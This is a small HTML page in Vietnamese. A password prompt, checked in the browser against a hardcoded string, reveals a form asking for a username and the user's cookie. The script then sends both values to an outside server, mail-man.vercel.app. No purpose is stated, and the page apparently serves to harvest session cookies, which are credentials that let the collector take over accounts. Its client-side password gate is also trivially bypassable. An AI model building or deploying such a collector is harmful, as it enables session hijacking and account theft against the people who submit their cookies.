<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Nhập tên người dùng và cookie</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f0f4f8;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
      }
      form,
      #passwordPrompt {
        background: white;
        padding: 20px 30px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        width: 300px;
        text-align: center;
      }
      label {
        display: block;
        margin-bottom: 8px;
        font-weight: bold;
      }
      input {
        width: 100%;
        padding: 8px;
        margin-bottom: 15px;
        border: 1px solid #ccc;
        border-radius: 4px;
      }
      button {
        width: 100%;
        padding: 10px;
        background-color: #0078d7;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
      }
      button:hover {
        background-color: #005fa3;
      }
    </style>
  </head>
  <body>
    <!-- Màn hình nhập mật khẩu -->
    <div id="passwordPrompt">
      <h2>Nhập mật khẩu để truy cập</h2>
      <input
        type="password"
        id="password"
        placeholder="Nhập mật khẩu"
        required
      />
      <button id="passwordBtn">Xác nhận</button>
    </div>

    <!-- Form thông tin người dùng -->
    <form id="userForm" style="display: none">
      <h2>Nhập thông tin</h2>
      <label for="username">Tên người dùng:</label>
      <input
        type="text"
        id="username"
        name="username"
        placeholder="Nhập tên người dùng"
        required
      />

      <label for="cookie">Cookie:</label>
      <input
        id="cookie"
        name="cookie"
        placeholder="Nhập cookie của bạn"
        required
      />

      <button type="submit">Gửi</button>
    </form>

    <script>
      const passwordPrompt = document.getElementById("passwordPrompt");
      const passwordInput = document.getElementById("password");
      const passwordBtn = document.getElementById("passwordBtn");
      const form = document.getElementById("userForm");

      passwordBtn.addEventListener("click", () => {
        const password = passwordInput.value;
        if (password === "caidaubui") {
          passwordPrompt.style.display = "none";
          form.style.display = "block";
        } else {
          alert("Mật khẩu sai!");
          passwordInput.value = "";
        }
      });

      form.addEventListener("submit", function (event) {
        event.preventDefault();
        const username = document.getElementById("username").value;
        const cookie = document.getElementById("cookie").value;
        console.log("Tên người dùng:", username);
        console.log("Cookie:", cookie);
        (async () => {
          try {
            const res = await fetch("https://mail-man.vercel.app/api/user", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                name: username,
                cookie: cookie,
              }),
            });
            alert("GOOD");
          } catch (error) {
            alert("BAD");
          }
        })();
      });
    </script>
  </body>
</html>
